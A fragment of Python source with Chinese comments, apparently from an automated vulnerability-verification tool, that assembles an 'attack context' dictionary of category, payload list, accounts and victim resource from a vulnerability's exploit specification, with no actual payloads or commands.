                         a1_evidence: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """构建随 TriggerSpec 登记的攻击上下文。

    返回 dict：category / attack_payloads / accounts / victim_resource_id / auth_binding。
    全部 best-effort：任何一项拿不到就给空值，由 D1 按降级路径处理，绝不抛异常阻断登记。
    """
    vuln_dict = vuln_dict or {}
    exploit_spec = vuln_dict.get("exploit_spec") or {}
    if not isinstance(exploit_spec, dict):
        exploit_spec = {}

    family = str((exploit_spec.get("payload") or {}).get("payload_family") or vuln_dict.get("family") or "")
    category = normalize_category(family, exploit_spec, vuln_dict)
    attack_payloads = select_attack_payloads(exploit_spec, family)

    # 业务族不需要 canary 通道的 payload（走差分），但仍保留以便人工核查。
    accounts: List[Dict[str, Any]] = []
    victim_resource_id = ""
    auth_binding: Dict[str, Any] = {}

    if is_business_logic(category):
        # 账户与受害者资源由「账户发现」填充（SAST 所有权推断 / auth-learning / account spec）。
        # 此处仅透传 A2 已在 prerequisites 里声明的部分，缺失留给发现阶段补。
        prereq = exploit_spec.get("prerequisites") or {}
        if isinstance(prereq, dict):
            roles = prereq.get("accounts") or prereq.get("roles") or []
            if isinstance(roles, list):
                accounts = [r for r in roles if isinstance(r, dict)]
            victim_resource_id = str(prereq.get("victim_resource_id") or "")
            ab = prereq.get("auth_binding")
            if isinstance(ab, dict):
                auth_binding = dict(ab)

    return {
        "category": category,
        "attack_payloads": attack_payloads,
        "accounts": accounts,
        "victim_resource_id": victim_resource_id,
        "auth_binding": auth_binding,
    }
